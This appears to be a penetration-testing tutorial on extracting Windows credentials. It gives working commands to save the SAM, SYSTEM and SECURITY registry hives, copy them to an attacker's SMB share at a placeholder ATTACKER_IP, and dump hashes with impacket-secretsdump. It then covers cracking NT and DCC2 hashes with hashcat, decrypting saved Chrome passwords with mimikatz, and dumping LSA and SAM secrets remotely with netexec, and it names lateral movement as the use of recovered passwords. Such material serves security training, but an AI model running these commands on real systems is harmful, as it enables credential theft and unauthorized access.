When administrative access is obtained on a Windows system, it is possible to extract registry hives that contain credential material. These hives can be dumped, transferred to an attacker machine, and analyzed offline. Offline attacks allow continued credential extraction and cracking without maintaining access to the target system.

---

## Windows Security Architecture (High-Level)

Windows does **not** store all credentials in a single place.

- **SAM** stores local account password hashes.
    
- **DPAPI** encrypts application and user secrets.
    
- **LSA (lsass.exe)** is the security authority that **uses and protects** these components.
    
- **SECURITY hive** stores secrets required by LSA to function.
    

LSA is **not a database**. It is the **security authority and orchestrator**.

```pgsql
            ┌────────────┐
            │   LSA      │  ← authority
            │ (lsass)    │
            └─────┬──────┘
                  │
     ┌────────────┼────────────┐
     │            │            │
   SAM          DPAPI        SECURITY
(local hashes) (crypto)   (LSA secrets)

```

| Registry Hive | Purpose                                                                                      |
| ------------- | -------------------------------------------------------------------------------------------- |
| HKLM\SAM      | Stores password hashes for local user accounts                                               |
| HKLM\SYSTEM   | Contains the system boot key used to encrypt the SAM                                         |
| HKLM\SECURITY | Contains LSA secrets, cached domain credentials (DCC2), DPAPI keys, and other sensitive data |

The SYSTEM hive is mandatory to decrypt the SAM database.

---

## Dumping Registry Hives (Local)

Administrative privileges are required.

### Save registry hives using reg.exe
Using `reg.exe` you can copy the registry hives.

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

If only local user hashes are needed, SAM and SYSTEM are sufficient. SECURITY is useful for cached domain credentials and DPAPI material.


### Transferring Hive Files to Attacker Machine

#### Create an SMB share using Impacket (Attacker Machine)

```bash
impacket-smbserver -smb2support CompData /home/attacker/share
```

`-smb2support` is required because SMBv1 is disabled on modern Windows systems.

#### Move hive files from the target

```cmd
move sam.save \\ATTACKER_IP\CompData
move system.save \\ATTACKER_IP\CompData
move security.save \\ATTACKER_IP\CompData
```

### Dumping Hashes Offline with Secretsdump
Using `secretsdump` is straightforward. We simply run the script and specify each of the hive files we retrieved from the target host.

#### Run secretsdump with retrieved hives

```bash
sudo impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

### Cracking the Hashes

#### Cracking NT Hashes with Hashcat
These hashes are obtained from the SAM.

- Hashcat mode: `1000`

```bash
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

Recovered passwords can be reused for:

- Lateral movement
    
- SMB authentication
    
- RDP access
    
- Credential reuse attacks
    


#### Cracking DCC2 hashes with Hashcat
Cached domain credentials are stored in `HKLM\SECURITY`. These hashes use PBKDF2, are much slower to crack than NT hashes and cannot be used with Pass-the-Hash.

- Hashcat mode: `2100`
    

```bash
hashcat -m 2100 '$DCC2$10240#administrator#HASH' /usr/share/wordlists/rockyou.txt
```



---

## DPAPI (Data Protection API)

DPAPI is a Windows feature used to **encrypt and protect sensitive data** at the user and system level. DPAPI `machine and user keys` are also dumped from `HKLM\SECURITY`.

DPAPI is widely used by both Windows and third‑party applications to store credentials and secrets.

|Application|Protected Data|
|---|---|
|Chrome / Internet Explorer|Saved website usernames and passwords|
|Outlook|Email account passwords|
|Remote Desktop (RDP)|Stored credentials for remote connections|
|Credential Manager|WiFi, VPN, and network authentication credentials|

If an attacker gains administrative access or the user’s credentials, DPAPI-protected data can often be decrypted.


#### Dumping Chrome Credentials with Mimikatz

With access to the user context or administrative privileges, saved Chrome credentials can be decrypted:

```cmd
mimikatz
dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

This command locates Chrome’s encrypted credential database and uses DPAPI to decrypt stored usernames and passwords.

---

## Remote Dumping 

With access to credentials that have `local administrator privileges`, it is also possible to target LSA secrets over the network. This may allow us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.

#### Dumping HKLM\SECURITY secrets
```bash
netexec smb TARGET_IP --local-auth -u USER -p PASSWORD --lsa
```

This command authenticates to the target over SMB and extracts LSA secrets without requiring interactive access to the system.

#### Dumping HKLM\SAM secrets
Similarly, we can use `netexec` to dump hashes from the SAM database remotely.

```bash
netexec smb TARGET_IP --local-auth -u USER -p PASSWORD --sam
```
